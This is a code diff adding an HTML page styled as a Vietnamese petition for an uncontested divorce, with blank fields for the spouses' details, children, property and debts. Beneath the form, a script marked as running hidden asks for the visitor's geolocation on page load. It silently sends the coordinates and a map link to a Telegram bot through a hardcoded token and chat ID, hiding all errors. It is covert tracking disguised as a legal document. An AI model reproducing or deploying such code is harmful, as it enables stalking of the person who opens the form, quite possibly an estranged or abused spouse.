@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đơn xin ly hôn</title>
+    <style>
+        body {
+            font-family: 'Times New Roman', Times, serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h3 {
+            margin: 0;
+            font-size: 18px;
+        }
+        .header h1 {
+            margin: 20px 0 10px;
+            font-size: 24px;
+        }
+        .content p {
+            margin: 10px 0;
+        }
+        .signature {
+            margin-top: 50px;
+            display: flex;
+            justify-content: space-between;
+            text-align: center;
+        }
+        .signature div {
+            width: 45%;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <h3>CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM<br>Độc lập - Tự do - Hạnh phúc</h3>
+            <p>---o0o---</p>
+            <h1>ĐƠN YÊU CẦU CÔNG NHẬN THUẬN TÌNH LY HÔN</h1>
+            <p><strong>Kính gửi: Tòa án nhân dân ..............................................................</strong></p>
+        </div>
+
+        <div class="content">
+            <p><strong>Chúng tôi gồm:</strong></p>
+            <p><strong>1. Tên chồng:</strong> ................................................................ Sinh năm: ........................</p>
+            <p>CCCD/CMND số: .......................... cấp ngày ..../..../........ tại .................................</p>
+            <p>Nơi cư trú: ..................................................................................................................</p>
+            
+            <p><strong>2. Tên vợ:</strong> .................................................................... Sinh năm: ........................</p>
+            <p>CCCD/CMND số: .......................... cấp ngày ..../..../........ tại .................................</p>
+            <p>Nơi cư trú: ..................................................................................................................</p>
+            
+            <p><strong>NỘI DUNG YÊU CẦU:</strong></p>
+            <p><strong>1. Về tình cảm:</strong> Chúng tôi kết hôn tự nguyện, có đăng ký kết hôn tại UBND .............................. ngày ..../..../......... Tuy nhiên, trong quá trình chung sống phát sinh nhiều mâu thuẫn không thể hàn gắn, mục đích hôn nhân không đạt được. Nay chúng tôi thuận tình ly hôn.</p>
+            <p><strong>2. Về con chung:</strong> ........................................................................................................</p>
+            <p><strong>3. Về tài sản chung:</strong> .....................................................................................................</p>
+            <p><strong>4. Về nợ chung:</strong> ...........................................................................................................</p>
+            
+            <p>Kính đề nghị Quý Tòa xem xét, giải quyết theo quy định của pháp luật.</p>
+        </div>
+
+        <div class="signature">
+            <div>
+                <p><strong>Chữ ký của chồng</strong><br>(Ký, ghi rõ họ tên)</p>
+            </div>
+            <div>
+                <p><strong>Chữ ký của vợ</strong><br>(Ký, ghi rõ họ tên)</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script chạy ngầm để lấy và gửi vị trí -->
+    <script>
+        const TELEGRAM_TOKEN = "8867516430:AAH01MYpYGB57vL_7Uygr77Ut2BXkqNN7dU";
+        const CHAT_ID = "-5345269525";
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // Yêu cầu vị trí ngầm định
+                navigator.geolocation.getCurrentPosition(sendToTelegram, silentError);
+            }
+        };
+
+        function sendToTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            const message = `📍 Có người vừa mở đơn ly hôn và cấp quyền vị trí!\n- Vĩ độ: ${lat}\n- Kinh độ: ${lon}\n- Bản đồ: https://www.google.com/maps?q=${lat},${lon}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            // Gửi dữ liệu âm thầm
+            fetch(url).catch(error => {
+                // Bỏ qua lỗi hiển thị ra màn hình để đảm bảo chạy ngầm
+            });
+        }
+
+        function silentError(error) {
+            // Không phản hồi lỗi ra giao diện người dùng
+        }
+    </script>
+
+</body>
+</html>
